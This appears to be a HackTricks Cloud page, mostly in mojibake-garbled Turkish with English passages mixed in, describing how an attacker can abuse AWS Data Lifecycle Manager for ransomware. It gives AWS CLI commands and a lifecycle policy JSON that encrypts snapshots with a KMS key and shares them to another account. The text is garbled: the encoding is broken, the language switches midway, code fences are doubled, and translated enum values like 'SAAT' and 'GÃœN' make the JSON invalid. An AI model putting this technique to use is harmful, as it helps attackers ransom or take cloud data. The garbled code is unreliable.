# AWS - Veri YaÅŸam DÃ¶ngÃ¼sÃ¼ YÃ¶neticisi

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
{% endhint %}

## Veri YaÅŸam DÃ¶ngÃ¼sÃ¼ YÃ¶neticisi (DLM)

### `EC2:DescribeVolumes`, `DLM:CreateLifeCyclePolicy`

Bir fidye yazÄ±lÄ±mÄ± saldÄ±rÄ±sÄ±, mÃ¼mkÃ¼n olduÄŸunca Ã§ok sayÄ±da EBS hacmini ÅŸifreleyerek mevcut EC2 Ã¶rneklerini, EBS hacimlerini ve anlÄ±k gÃ¶rÃ¼ntÃ¼leri silerek gerÃ§ekleÅŸtirilebilir. Bu kÃ¶tÃ¼ niyetli faaliyeti otomatikleÅŸtirmek iÃ§in Amazon DLM kullanÄ±labilir, anlÄ±k gÃ¶rÃ¼ntÃ¼leri baÅŸka bir AWS hesabÄ±ndan bir KMS anahtarÄ± ile ÅŸifreleyerek ve ÅŸifrelenmiÅŸ anlÄ±k gÃ¶rÃ¼ntÃ¼leri farklÄ± bir hesaba aktararak. Alternatif olarak, anlÄ±k gÃ¶rÃ¼ntÃ¼leri ÅŸifrelemeden kendi yÃ¶nettiÄŸi bir hesaba aktarabilir ve ardÄ±ndan orada ÅŸifreleyebilir. Mevcut EBS hacimlerini veya anlÄ±k gÃ¶rÃ¼ntÃ¼leri doÄŸrudan ÅŸifrelemek kolay olmasa da, yeni bir hacim veya anlÄ±k gÃ¶rÃ¼ntÃ¼ oluÅŸturarak bunu yapmak mÃ¼mkÃ¼ndÃ¼r.

Ä°lk olarak, bir komut kullanarak Ã¶rnek kimliÄŸi, hacim kimliÄŸi, ÅŸifreleme durumu, eklenti durumu ve hacim tÃ¼rÃ¼ gibi hacimlerle ilgili bilgileri toplayacaksÄ±nÄ±z.
```aws ec2 describe-volumes```

Secondly, one will create the lifecycle policy. This command employs the DLM API to set up a lifecycle policy that automatically takes daily snapshots of specified volumes at a designated time. It also applies specific tags to the snapshots and copies tags from the volumes to the snapshots. The policyDetails.json file includes the lifecycle policy's specifics, such as target tags, schedule, the ARN of the optional KMS key for encryption, and the target account for snapshot sharing, which will be recorded in the victim's CloudTrail logs.


```bash
```plaintext
aws dlm create-lifecycle-policy --description "Ä°lk politikam" --state ENABLED --execution-role-arn arn:aws:iam::12345678910:role/AWSDataLifecycleManagerDefaultRole --policy-details file://policyDetails.json
```
```

A template for the policy document can be seen here:
```bash
```json
{
"PolicyType": "EBS_SNAPSHOT_MANAGEMENT",
"ResourceTypes": [
"VOLUME"
],
"TargetTags": [
{
"Key": "ExampleKey",
"Value": "ExampleValue"
}
],
"Schedules": [
{
"Name": "GÃ¼nlÃ¼kSnapshotlar",
"CopyTags": true,
"TagsToAdd": [
{
"Key": "SnapshotOluÅŸturan",
"Value": "DLM"
}
],
"VariableTags": [
{
"Key": "MaliyetMerkezi",
"Value": "Finans"
}
],
"CreateRule": {
"Interval": 24,
"IntervalUnit": "SAAT",
"Times": [
"03:00"
]
},
"RetainRule": {
"Count": 14
},
"FastRestoreRule": {
"Count": 2,
"Interval": 12,
"IntervalUnit": "SAAT"
},
"CrossRegionCopyRules": [
{
"TargetRegion": "us-west-2",
"Encrypted": true,
"CmkArn": "arn:aws:kms:us-west-2:123456789012:key/your-kms-key-id",
"CopyTags": true,
"RetainRule": {
"Interval": 1,
"IntervalUnit": "GÃœN"
}
}
],
"ShareRules": [
{
"TargetAccounts": [
"123456789012"
],
"UnshareInterval": 30,
"UnshareIntervalUnit": "GÃœN"
}
]
}
],
"Parameters": {
"ExcludeBootVolume": false
}
}
```
```

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
